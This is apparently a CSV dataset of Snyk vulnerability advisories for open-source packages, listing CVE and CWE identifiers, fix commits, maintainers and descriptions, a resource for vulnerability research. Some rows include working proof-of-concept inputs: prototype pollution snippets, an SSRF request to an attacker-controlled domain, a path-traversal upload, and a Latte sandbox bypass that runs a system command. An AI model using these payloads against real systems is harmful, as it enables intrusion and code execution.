CVE-2021-23597,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-FASTIFYMULTIPART-2395480,11/02/2022,07/02/2022,https://github.com/fastify/fastify-multipart/commit/a70dc7059a794589bd4fe066453141fc609e6066,Denial of Service (DoS),https://api.github.com/repos/fastify/fastify-multipart/commits/a70dc7059a794589bd4fe066453141fc609e6066,Matteo Collina,hello@matteocollina.com,fastify-multipart,a70dc7059a794589bd4fe066453141fc609e6066,Merge pull request from GHSA-qh73-qc3p-rjv2,JavaScript,7.5,high,"fastify-multipart is a Multipart plugin for Fastify
Affected versions of this package are vulnerable to Denial of Service (DoS). By providing a name=constructor property it is still possible to crash the application. 
Note: This is a bypass of CVE-2020-8136 (https://security.snyk.io/vuln/SNYK-JS-FASTIFYMULTIPART-1290382).",2022
CVE-2021-23555,CWE-265,Snyk,https://security.snyk.io/vuln/SNYK-JS-VM2-2309905,09/02/2022,06/12/2021,https://github.com/patriksimek/vm2/commit/532120d5cdec7da8225fc6242e154ebabc63fe4d,Sandbox Bypass,https://api.github.com/repos/patriksimek/vm2/commits/532120d5cdec7da8225fc6242e154ebabc63fe4d,XmiliaH,45106915+XmiliaH@users.noreply.github.com,vm2,532120d5cdec7da8225fc6242e154ebabc63fe4d,"Merge pull request #395 from XmiliaH/security-fixes

Internal restructuring and security improvements",Unknown,9.8,critical,"vm2 is a sandbox that can run untrusted code with whitelisted Node's built-in modules.
Affected versions of this package are vulnerable to Sandbox Bypass via direct access to host error objects generated by node internals during generation of a stacktraces, which can lead to execution of arbitrary code on the host machine.",2022
CVE-2021-23470,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487,03/02/2022,02/02/2022,https://github.com/panates/putil-merge/commit/476d00078dfb2827d7c9ee0f2392c81b864f7bc5,Prototype Pollution,https://api.github.com/repos/panates/putil-merge/commits/476d00078dfb2827d7c9ee0f2392c81b864f7bc5,Eray Hanoğlu,e.hanoglu@panates.com,putil-merge,476d00078dfb2827d7c9ee0f2392c81b864f7bc5,Fixed Prototype Pollution vulnerability (constructor). Thanks to Gill from Snyk Security,JavaScript,8.2,high,"putil-merge is a Lightweight solution for merging multiple objects into one. Also it supports deep merge.
Affected versions of this package are vulnerable to Prototype Pollution. The merge() function does not check the values passed into the argument. An attacker can supply a malicious value by adjusting the value to include the constructor property.
Note:  This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077",2022
CVE-2021-23497,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-STRIKEENTCOSET-2385945,31/01/2022,27/01/2022,https://github.com/strikeentco/set/commit/b2f942c,Prototype Pollution,https://api.github.com/repos/strikeentco/set/commits/b2f942c,Alexey Bystrov,strikeentco@gmail.com,set,b2f942c29652066e484436a8cb0032932f085e9a,"1.0.2

+ Prototype Pollution fix
+ dependencies are up to date",Config files,7.5,high,"Affected versions of this package are vulnerable to Prototype Pollution. It allows an attacker to cause a denial of service and may lead to remote code execution.
Note:  This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-STRIKEENTCOSET-1038821",2022
CVE-2021-23507,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATHSET-2388576,31/01/2022,30/01/2022,https://github.com/skratchdot/object-path-set/commit/2d67a714159c4099589b6661fa84e6d2adc31761,Prototype Pollution,https://api.github.com/repos/skratchdot/object-path-set/commits/2d67a714159c4099589b6661fa84e6d2adc31761,skratchdot,git@skratchdot.com,object-path-set,2d67a714159c4099589b6661fa84e6d2adc31761,fix new prototype pollution vulnerability,Markdown,7.5,high,"object-path-set is a set values in javascript objects by specifying a path
Affected versions of this package are vulnerable to Prototype Pollution via the setPath method, as it allows an attacker to merge object prototypes into it.
Note:This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-OBJECTPATHSET-607908",2022
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SCARTCORE-2388634,31/01/2022,31/01/2022,https://github.com/s-cart/core/commit/017951d62fa233b88bb8305e7eb4a13ee2b84efb,Cross-site Scripting (XSS),https://api.github.com/repos/s-cart/core/commits/017951d62fa233b88bb8305e7eb4a13ee2b84efb,S-Cart,giaiphap247.com@gmail.com,core,017951d62fa233b88bb8305e7eb4a13ee2b84efb,Fix xss,PHP,6.5,medium,"s-cart/core is a free Laravel e-commerce for business.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) in Admin section. It have the potential to steal a user's cookie and gain unauthorized access to that user's account through the stolen cookie.",2022
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SCARTSCART-2388647,31/01/2022,31/01/2022,https://github.com/s-cart/core/commit/017951d62fa233b88bb8305e7eb4a13ee2b84efb,Cross-site Scripting (XSS),https://api.github.com/repos/s-cart/core/commits/017951d62fa233b88bb8305e7eb4a13ee2b84efb,S-Cart,giaiphap247.com@gmail.com,core,017951d62fa233b88bb8305e7eb4a13ee2b84efb,Fix xss,PHP,6.5,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) in Admin section. It have the potential to steal a user's cookie and gain unauthorized access to that user's account through the stolen cookie.,2022
CVE-2021-23592,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-PHP-TOPTHINKFRAMEWORK-2385695,27/01/2022,13/12/2021,https://github.com/top-think/framework/commit/d3b5aeae94bc71bae97977d05cd12c3e0550905c,Deserialization of Untrusted Data,https://api.github.com/repos/top-think/framework/commits/d3b5aeae94bc71bae97977d05cd12c3e0550905c,ThinkPHP,liuchen@topthink.net,framework,d3b5aeae94bc71bae97977d05cd12c3e0550905c,改进缓存驱动unserialize方法参数类型限制,PHP,7.7,high,"topthink/framework is a The ThinkPHP Framework.
Affected versions of this package are vulnerable to Deserialization of Untrusted Data due to insecure unserialize method in the Driver class.",2022
CVE-2021-23558,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-BMOOR-2342622,25/01/2022,18/01/2022,https://github.com/b-heilman/bmoor/commit/29b0162cc1dc1791fc060891f568b0ae29bc542b,Prototype Pollution,https://api.github.com/repos/b-heilman/bmoor/commits/29b0162cc1dc1791fc060891f568b0ae29bc542b,Brian Heilman,brian.heilman@gmail.com,bmoor,29b0162cc1dc1791fc060891f568b0ae29bc542b,fix: bug with [__proto__],Config files,7.3,high,"bmoor is an A basic foundation for other libraries, establishing useful patterbs, and letting them be more.
Affected versions of this package are vulnerable to Prototype Pollution due to missing sanitization in  set function.
Note:  This vulnerability derives from an incomplete fix in CVE-2020-7736
POC:
const bmoor = require(""bmoor"");
bmoor.set({}, [[""__proto__""], ""polluted""], ""polluted"");
console.log({}.polluted)",2022
CVE-2021-23484,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JS-ZIPLOCAL-2327477,25/01/2022,29/12/2021,https://github.com/Mostafa-Samir/zip-local/commit/949446a95a660c0752b1db0c654f0fd619ae6085,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/Mostafa-Samir/zip-local/commits/949446a95a660c0752b1db0c654f0fd619ae6085,Mostafa Samir,mostafa.3210@gmail.com,zip-local,949446a95a660c0752b1db0c654f0fd619ae6085,add test for sync unzipping a zip-slip attack file,JavaScript,9.8,critical,"zip-local is a to zip and unzip local directories
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) which can lead to an extraction of a crafted file outside the intended extraction directory.",2022
CVE-2021-23631,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOJPEG-2348245,20/01/2022,05/09/2021,https://github.com/neocotic/convert-svg/commit/c9e48d259fe4c540aec0cbe06a05bb2d04745201,Directory Traversal,https://api.github.com/repos/neocotic/convert-svg/commits/c9e48d259fe4c540aec0cbe06a05bb2d04745201,neocotic,alasdair.mercer@unity3d.com,convert-svg,c9e48d259fe4c540aec0cbe06a05bb2d04745201,"Release 0.6.0 (#76)

* **Breaking Change:** All packages now require Node.js version 12.20.0 or newer
* Support UTF-8 characters in SVG
* Support SVG dimensions (width, height) that use `pt` units
* Add `rounding` API and CLI option to control how dimensions are rounded (defaults to `""round""`)
* Fix [CVE-2021-23631](https://nvd.nist.gov/vuln/detail/CVE-2021-23631) by improving input validation
* `quality` CLI option for JPEG not passed correctly [#65](https://github.com/neocotic/convert-svg/issues/65)
* Bump dependencies (incl. major for Puppeteer)
* Bump devDependencies
* Skip inconsistent tests",Unknown,7.5,high,"convert-svg-to-jpeg is a package for converting SVG to JPEG using headless Chromium.
Affected versions of this package are vulnerable to Directory Traversal. Using a specially crafted SVG file, an attacker could read arbitrary files from the file system and then show the file content as a converted PNG file.",2022
CVE-2021-23631,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244,20/01/2022,05/09/2021,https://github.com/neocotic/convert-svg/commit/c9e48d259fe4c540aec0cbe06a05bb2d04745201,Directory Traversal,https://api.github.com/repos/neocotic/convert-svg/commits/c9e48d259fe4c540aec0cbe06a05bb2d04745201,neocotic,alasdair.mercer@unity3d.com,convert-svg,c9e48d259fe4c540aec0cbe06a05bb2d04745201,"Release 0.6.0 (#76)

* **Breaking Change:** All packages now require Node.js version 12.20.0 or newer
* Support UTF-8 characters in SVG
* Support SVG dimensions (width, height) that use `pt` units
* Add `rounding` API and CLI option to control how dimensions are rounded (defaults to `""round""`)
* Fix [CVE-2021-23631](https://nvd.nist.gov/vuln/detail/CVE-2021-23631) by improving input validation
* `quality` CLI option for JPEG not passed correctly [#65](https://github.com/neocotic/convert-svg/issues/65)
* Bump dependencies (incl. major for Puppeteer)
* Bump devDependencies
* Skip inconsistent tests",Unknown,7.5,high,"convert-svg-to-png is a package for converting SVG to PNG using headless Chromium.
Affected versions of this package are vulnerable to Directory Traversal. Using a specially crafted SVG file, an attacker could read arbitrary files from the file system and then show the file content as a converted PNG file.",2022
CVE-2021-23631,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785,20/01/2022,05/09/2021,https://github.com/neocotic/convert-svg/commit/c9e48d259fe4c540aec0cbe06a05bb2d04745201,Directory Traversal,https://api.github.com/repos/neocotic/convert-svg/commits/c9e48d259fe4c540aec0cbe06a05bb2d04745201,neocotic,alasdair.mercer@unity3d.com,convert-svg,c9e48d259fe4c540aec0cbe06a05bb2d04745201,"Release 0.6.0 (#76)

* **Breaking Change:** All packages now require Node.js version 12.20.0 or newer
* Support UTF-8 characters in SVG
* Support SVG dimensions (width, height) that use `pt` units
* Add `rounding` API and CLI option to control how dimensions are rounded (defaults to `""round""`)
* Fix [CVE-2021-23631](https://nvd.nist.gov/vuln/detail/CVE-2021-23631) by improving input validation
* `quality` CLI option for JPEG not passed correctly [#65](https://github.com/neocotic/convert-svg/issues/65)
* Bump dependencies (incl. major for Puppeteer)
* Bump devDependencies
* Skip inconsistent tests",Unknown,7.5,high,"convert-svg-core is a package that supports converting SVG into another format using headless Chromium.
Affected versions of this package are vulnerable to Directory Traversal. Using a specially crafted SVG file, an attacker could read arbitrary files from the file system and then show the file content as a converted PNG file.",2022
CVE-2021-23518,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-CACHEDPATHRELATIVE-2342653,20/01/2022,19/01/2022,https://github.com/ashaffer/cached-path-relative/commit/40c73bf70c58add5aec7d11e4f36b93d144bb760,Prototype Pollution,https://api.github.com/repos/ashaffer/cached-path-relative/commits/40c73bf70c58add5aec7d11e4f36b93d144bb760,Andrew,darawk@gmail.com,cached-path-relative,40c73bf70c58add5aec7d11e4f36b93d144bb760,Fix other instances of prototype pollution vulnerability,JavaScript,7.3,high,"cached-path-relative is a memoize the results of the path.relative function.
Affected versions of this package are vulnerable to Prototype Pollution via the cache variable that is set as {} instead of Object.create(null) in the cachedPathRelative function, which allows access to the parent prototype properties when the object is used to create the cached relative path. When using the origin path as __proto__, the attribute of the object is accessed instead of a path.
Note:  This vulnerability derives from an incomplete fix in https://security.snyk.io/vuln/SNYK-JS-CACHEDPATHRELATIVE-72573
###PoC
let cpr = require(""cached-path-relative"");
process.chdir(""tst"");
cpr(""__proto__"", ""polluted"")
console.log({}.polluted);

//output: ../polluted",2022
CVE-2021-23664,CWE-918,Snyk,https://security.snyk.io/vuln/SNYK-JS-ISOMORPHICGITCORSPROXY-1734788,20/01/2022,15/10/2021,https://github.com/isomorphic-git/cors-proxy/commit/1b1c91e71d946544d97ccc7cf0ac62b859e03311,Server-side Request Forgery (SSRF),https://api.github.com/repos/isomorphic-git/cors-proxy/commits/1b1c91e71d946544d97ccc7cf0ac62b859e03311,William Hilton,wmhilton@gmail.com,cors-proxy,1b1c91e71d946544d97ccc7cf0ac62b859e03311,fix(security): don't follow redirects (#10),Config files,8.6,high,"@isomorphic-git/cors-proxy is a Proxy clone and push requests for the browser
Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) due to missing sanitization and validation of the redirection action in middleware.js.
PoC
GET /www.attacker-controlled-domain.com/info/refs?service=git-receive-pack HTTP/1.1
Host: target.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close",2022
CVE-2022-25345,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-2403100,16/06/2022,16/02/2022,https://github.com/discordjs/opus/commit/406249f3fca484a2af97a34ceb989019efa09bc7,Denial of Service (DoS),https://api.github.com/repos/discordjs/opus/commits/406249f3fca484a2af97a34ceb989019efa09bc7,Vlad Frangu,kingdgrizzle@gmail.com,opus,406249f3fca484a2af97a34ceb989019efa09bc7,chore: fix CVE and add more prebuilds (#132),Config files,7.5,high,"@discordjs/opus is a native bindings to libopus.
Affected versions of this package are vulnerable to Denial of Service (DoS) when trying to encode using an encoder with zero channels, or a non-initialized buffer. This leads to a hard crash.",2022
CVE-2022-21213,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MOUT-2342654,15/06/2022,19/01/2022,https://github.com/mout/mout/commit/17ffdc2a96417a63a0147156dc045e90d0d14c64,Prototype Pollution,https://api.github.com/repos/mout/mout/commits/17ffdc2a96417a63a0147156dc045e90d0d14c64,Mathias Paumgarten,mail@mathias-paumgarten.com,mout,17ffdc2a96417a63a0147156dc045e90d0d14c64,"Merge pull request #279 from ssong/fix-for-CVE-2022-21213

Fix for CVE-2022-21213",Config files,7.5,high,"mout is a Modular Utilities
Affected versions of this package are vulnerable to Prototype Pollution. The deepFillIn function can be used to 'fill missing properties recursively', while the deepMixIn mixes objects into the target object, recursively mixing existing child objects as well. In both cases, the key used to access the target object recursively is not checked, leading to exploiting this vulnerability.
Note:  This vulnerability derives from an incomplete fix of CVE-2020-7792.",2022
CVE-2021-23567,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-COLORS-2331906,09/01/2022,09/01/2022,https://github.com/Marak/colors.js/commit/074a0f8ed0c31c35d13d28632bd8a049ff136fb6#diff-92bbac9a308cd5fcf9db165841f2d90ce981baddcb2b1e26cfff170929af3bd1R18,Denial of Service (DoS),https://api.github.com/repos/Marak/colors.js/commits/074a0f8ed0c31c35d13d28632bd8a049ff136fb6#diff-92bbac9a308cd5fcf9db165841f2d90ce981baddcb2b1e26cfff170929af3bd1R18,Marak,marak.squires@gmail.com,colors.js,074a0f8ed0c31c35d13d28632bd8a049ff136fb6,Adds new American flag module,JavaScript,7.5,high,"colors is a color manipulation library.
Affected versions of this package are vulnerable to Denial of Service (DoS) that was introduced through an infinite loop in the americanFlag module. 
Unfortunately this appears to have been a purposeful attempt by a maintainer of colors to make the package unusable, other maintainers' controls over this package appear to have been revoked in an attempt to prevent them from fixing the issue.",2022
CVE-2021-23566,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-NANOID-2332193,12/01/2022,11/01/2022,https://github.com/ai/nanoid/commit/2b7bd9332bc49b6330c7ddb08e5c661833db2575,Information Exposure,https://api.github.com/repos/ai/nanoid/commits/2b7bd9332bc49b6330c7ddb08e5c661833db2575,Arutyunyan Artyom,artalar@ya.ru,nanoid,2b7bd9332bc49b6330c7ddb08e5c661833db2575,fix collision by proxy number (#328),JavaScript,4.0,medium,Affected versions of this package are vulnerable to Information Exposure via the valueOf() function which allows to reproduce the last id generated.,2022
CVE-2021-23568,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-EXTEND2-2320315,03/01/2022,15/12/2021,https://github.com/eggjs/extend2/commit/aa332a59116c8398976434b57ea477c6823054f8,Prototype Pollution,https://api.github.com/repos/eggjs/extend2/commits/aa332a59116c8398976434b57ea477c6823054f8,Haoliang Gao,sakura9515@gmail.com,extend2,aa332a59116c8398976434b57ea477c6823054f8,fix: __proto__ copy (#2),Config files,7.3,high,"extend2 is a forked from node-extend, the difference is overriding array as primitive when deep clone.
Affected versions of this package are vulnerable to Prototype Pollution via the extend function due to unsafe recursive merge.
POC:

var e = require (""extend2"")
e(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'))
console.log(""Is polluted? "" + ""anything"".polluted)",2022
CVE-2021-23772,CWE-59,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKATARASIRISV12-2325170,24/12/2021,24/12/2021,https://github.com/kataras/iris/commit/e213dba0d32ff66653e0ef124bc5088817264b08,Arbitrary File Write,https://api.github.com/repos/kataras/iris/commits/e213dba0d32ff66653e0ef124bc5088817264b08,Gerasimos (Makis) Maropoulos,kataras2006@hotmail.com,iris,e213dba0d32ff66653e0ef124bc5088817264b08,security fix,Markdown,7.5,high,"github.com/kataras/iris/v12 is a fast, simple yet fully featured and very efficient web framework for Go.
Affected versions of this package are vulnerable to Arbitrary File Write.
The unsafe handling of file names during upload using UploadFormFiles method may enable attackers to write to arbitrary locations outside the designated target folder.
PoC by Snyk
Based on the upload-files example.
POST /upload HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----xxx
Connection: close
Content-Length: 151

------xxx
Content-Disposition: form-data; name=""uploadfile""; filename=""..././..././malicious-file""
Content-Type: text/plain
pwned
------xxx--

Note: the vulnerability is only possible in Go < 1.7.5 due to unsafe net/http behaviour.",2021
CVE-2021-23772,CWE-59,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKATARASIRIS-2325169,24/12/2021,24/12/2021,https://github.com/kataras/iris/commit/e213dba0d32ff66653e0ef124bc5088817264b08,Arbitrary File Write,https://api.github.com/repos/kataras/iris/commits/e213dba0d32ff66653e0ef124bc5088817264b08,Gerasimos (Makis) Maropoulos,kataras2006@hotmail.com,iris,e213dba0d32ff66653e0ef124bc5088817264b08,security fix,Markdown,7.5,high,"github.com/kataras/iris is a fast, simple yet fully featured and very efficient web framework for Go.
Affected versions of this package are vulnerable to Arbitrary File Write.
The unsafe handling of file names during upload using UploadFormFiles method may enable attackers to write to arbitrary locations outside the designated target folder.
PoC by Snyk
Based on the upload-files example.
POST /upload HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----xxx
Connection: close
Content-Length: 151

------xxx
Content-Disposition: form-data; name=""uploadfile""; filename=""..././..././malicious-file""
Content-Type: text/plain
pwned
------xxx--

Note: the vulnerability is only possible in Go < 1.7.5 due to unsafe net/http behaviour.",2021
CVE-2021-23490,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-PARSELINKHEADER-1582783,19/12/2021,19/12/2021,https://github.com/thlorenz/parse-link-header/commit/72f05c717b3f129c5331a07bf300ed8886eb8ae1,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/thlorenz/parse-link-header/commits/72f05c717b3f129c5331a07bf300ed8886eb8ae1,Assaf Ben Josef,80702314+assaf-benjosef@users.noreply.github.com,parse-link-header,72f05c717b3f129c5331a07bf300ed8886eb8ae1,"Limit linkHeader length, throw error if exceeds (#25)

* Limit linkheader length, add checkHeader func, update documentation

* indentation",Markdown,7.5,high,"parse-link-header is a package that parses a link header and returns paging information for each contained link.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the checkHeader function.",2021
CVE-2021-23792,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMTWELVEMONKEYSIMAGEIO-2316763,13/12/2021,07/12/2021,https://github.com/haraldk/TwelveMonkeys/commit/da4efe98bf09e1cce91b7633cb251958a200fc80,XML External Entity (XXE) Injection,https://api.github.com/repos/haraldk/TwelveMonkeys/commits/da4efe98bf09e1cce91b7633cb251958a200fc80,Harald Kuhr,harald.kuhr@gmail.com,TwelveMonkeys,da4efe98bf09e1cce91b7633cb251958a200fc80,Avoid fetching external resources in XMPReader.,Java,7.3,high,"com.twelvemonkeys.imageio:imageio-metadata is an ImageIO metadata module.
Affected versions of this package are vulnerable to XML External Entity (XXE) Injection due to an insecurely initialized XML parser for reading XMP Metadata. An attacker can exploit this vulnerability if they are able to supply a file (e.g. when an online profile picture is processed) with a malicious XMP segment. If the XMP metadata of the uploaded image is parsed, then the XXE vulnerability is triggered.",2021
CVE-2021-23803,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PHP-LATTELATTE-1932226,09/12/2021,26/11/2021,https://github.com/nette/latte/commit/227c86eda9a8a6d060ea8501923e768b6d992210,Access Control Bypass,https://api.github.com/repos/nette/latte/commits/227c86eda9a8a6d060ea8501923e768b6d992210,David Grudl,david@grudl.com,latte,227c86eda9a8a6d060ea8501923e768b6d992210,Parser: removes all control characters from template [Closes #279],PHP,9.8,critical,"latte/latte is an intuitive and fast template engine for those who want the most secure PHP sites. Introduces context-sensitive escaping.
Affected versions of this package are vulnerable to Access Control Bypass. There is a way to bypass allowFunctions that will affect the security of the application. When the template is set to allow/disallow the use of certain functions, adding control characters (x00-x08) after the function will bypass these restrictions.
PoC
// The following PoC will execute the system function ""whoami""
<?php
error_reporting(0);
require 'vendor/autoload.php';
$latte = new Latte\Engine;
$policy = new Latte\Sandbox\SecurityPolicy;
$policy->allowFilters($policy::ALL);
$policy->allowMacros(['if','=']);
$policy->allowFunctions(['strlen']);
$latte->setPolicy($policy);
$latte->setSandboxMode();
$latte->setAutoRefresh(false);
file_put_contents('index.latte',""{=system\x00('whoami')}"");
$latte->render('index.latte');",2021
CVE-2021-3815,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614,09/12/2021,30/11/2021,https://github.com/fabiocaccamo/utils.js/commit/102efafb291ce1916985514440d3bf8a6826890a,Prototype Pollution,https://api.github.com/repos/fabiocaccamo/utils.js/commits/102efafb291ce1916985514440d3bf8a6826890a,Fabio Caccamo,fabio.caccamo@gmail.com,utils.js,102efafb291ce1916985514440d3bf8a6826890a,Fixed prototype pollution. #6,JavaScript,8.6,high,"@fabiocaccamo/utils.js is a JavaScript utils for lazy devs.
Affected versions of this package are vulnerable to Prototype Pollution via the set() and method, which merges the path and value parameters based on the key:value.
###PoC
const utils = require(""@fabiocaccamo/utils.js"");
const obj = {};
const fake_obj = {};

console.log([+] Before prototype pollution : ${obj.polluted});
utils.object.keypath.set(fake_obj, 'proto.polluted', true);
console.log([+] After prototype pollution : ${obj.polluted});
/* 
[+] Before prototype pollution : undefined
[+] After prototype pollution : true
*/",2021
CVE-2021-23450,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOJO-1535223,08/12/2021,30/07/2021,https://github.com/dojo/dojo/commit/b7b8b279f3e082e9d4b54144fe831bdc77b2e0c9,Prototype Pollution,https://api.github.com/repos/dojo/dojo/commits/b7b8b279f3e082e9d4b54144fe831bdc77b2e0c9,Sanchit Chadha,31522190+schadha-ibm@users.noreply.github.com,dojo,b7b8b279f3e082e9d4b54144fe831bdc77b2e0c9,"Fix for CVE-2021-23450, prototype pollution (#418)",JavaScript,7.5,high,"dojo is a foundation package for the Dojo 1 Toolkit. While still being maintained, new development is primarily focused on modern Dojo.
Affected versions of this package are vulnerable to Prototype Pollution via the setObject function.
PoC
1. Install `dojo` by running `npm i dojo`.
2. Create the following HTML file in the directory where `dojo` is installed.
3. Access the HTML page via a browser - you should see the alert.

<!-- The HTML file -->
<!DOCTYPE html>
<html>
<head>
<script src=""node_modules/dojo/dojo.s""></script>
</head>
<body>
<script>
        document.addEventListener(""DOMContentLoaded"", function() {
                const obj = {};
                dojo.setObject(""proto.vuln"", ""polluted!"", obj);
                alert(""anything"".vuln);
        })
</script>
</body>
</html>",2021
CVE-2021-23639,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880,08/12/2021,23/09/2021,https://github.com/simonhaenisch/md-to-pdf/commit/a716259c548c82fa1d3b14a3422e9100619d2d8a,Remote Code Execution (RCE),https://api.github.com/repos/simonhaenisch/md-to-pdf/commits/a716259c548c82fa1d3b14a3422e9100619d2d8a,simonhaenisch,simonhaenisch@users.noreply.github.com,md-to-pdf,a716259c548c82fa1d3b14a3422e9100619d2d8a,"fix: disable JS engine for front-matter by default to prevent RCE

BREAKING CHANGE: If you previously used JS in front-matter, you'll now have to set `--gray-matter-options 'null'` (or `gray_matter_options: undefined`) to overwrite the new default options that disable the JS engine.

Fixes #99.",Markdown,9.8,critical,"md-to-pdf is a CLI tool for converting Markdown files to PDF.
Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to utilizing the library gray-matter to parse front matter content, without disabling the JS engine.",2021
CVE-2021-23758,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-AJAXPRO2-1925971,03/12/2021,21/11/2021,https://github.com/michaelschwarz/Ajax.NET-Professional/commit/b0e63be5f0bb20dfce507cb8a1a9568f6e73de57,Deserialization of Untrusted Data,https://api.github.com/repos/michaelschwarz/Ajax.NET-Professional/commits/b0e63be5f0bb20dfce507cb8a1a9568f6e73de57,Michael Schwarz,michaelschwarz@users.noreply.github.com,Ajax.NET-Professional,b0e63be5f0bb20dfce507cb8a1a9568f6e73de57,added allowed customized types,Unknown,8.1,high,"AjaxPro.2 is a .NET Library that provides AJAX related methods to simplify the communication between server and client.
Affected versions of this package are vulnerable to Deserialization of Untrusted Data due to the possibility of deserialization of arbitrary .NET classes, which can be abused to gain remote code execution.",2021
CVE-2021-23562,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-JS-PLUPLOAD-1583909,02/12/2021,09/09/2021,https://github.com/moxiecode/plupload/commit/d12175d4b5fa799b994ee1bb17bfbeec55b386fb,Arbitrary File Upload,https://api.github.com/repos/moxiecode/plupload/commits/d12175d4b5fa799b994ee1bb17bfbeec55b386fb,Spocke,spocke@moxiecode.com,plupload,d12175d4b5fa799b994ee1bb17bfbeec55b386fb,fixed another case of html entities not being encoded properly,JavaScript,4.2,medium,"plupload is a Plupload is JavaScript API for building file uploaders. It supports multiple file selection, file filtering, chunked upload, client side image downsizing and when necessary can fallback to alternative runtimes, like Flash and Silverlight.
Affected versions of this package are vulnerable to Arbitrary File Upload. A file name containing JavaScript code could be uploaded and run. An attacker would need to trick a user to upload this kind of file.",2021
,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SHOPXOSHOPXO-1540877,26/11/2021,13/08/2021,https://github.com/gongfuxiang/shopxo/commit/9b74beecf85b37e4c3b028d964f5a41c150e640d,Arbitrary File Upload,https://api.github.com/repos/gongfuxiang/shopxo/commits/9b74beecf85b37e4c3b028d964f5a41c150e640d,Devil,fuxiang.gong@qq.com,shopxo,9b74beecf85b37e4c3b028d964f5a41c150e640d,小程序主题上传优化,HTML,7.2,high,"shopxo/shopxo is an e-commerce system.
Affected versions of this package are vulnerable to Arbitrary File Upload. After logging in as an administrator, you can upload a compressed package carrying malicious files to achieve the purpose of remote code execution.",2021
CVE-2021-41279,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-PHP-BASERPROJECTBASERCMS-1316241,28/11/2021,06/07/2021,https://github.com/baserproject/basercms/commit/9088b99c329d1faff3a2f1269f37b9a9d8d5f6ff,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/baserproject/basercms/commits/9088b99c329d1faff3a2f1269f37b9a9d8d5f6ff,gondoh,gondoh@gufii.net,basercms,9088b99c329d1faff3a2f1269f37b9a9d8d5f6ff,"Merge pull request from GHSA-7rpc-9m88-cf9w

* 固定ページプレビュー実行時に入力内容検証を追加

* SimpleZipの利用を停止しZipArchiveの利用に切り替え

* 不要コード除去

* BcZip利用時、ZipArchiveをopenしていない場合エラーログが出力される問題を改善",PHP,3.0,low,"baserproject/basercms is a Content management system based on CakePHP.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). In the admin panel of basercms, an administrator with privileges to perform maintenance operations, has access to the page /admin/tools/maintenance. This page has a functionality used to restore the database data by uploading a ZIP archive. An attacker could abuse this functionality to perform a ZIP slip attack by uploading a malicious ZIP archive.
This is due to invalid ZIP archive filename check via the _readFile method of the class Simplezip in the file lib/Baser/Vendor/Simplezip.php, and an attacker can a file with the following path: ../../../../../../../webroot/code.php. This would cause code.php to be saved in the webroot directory.
This vulnerability requires gaining specific admin privileges, i.e. - another vulnerability before this one to be exploited successfully.",2021
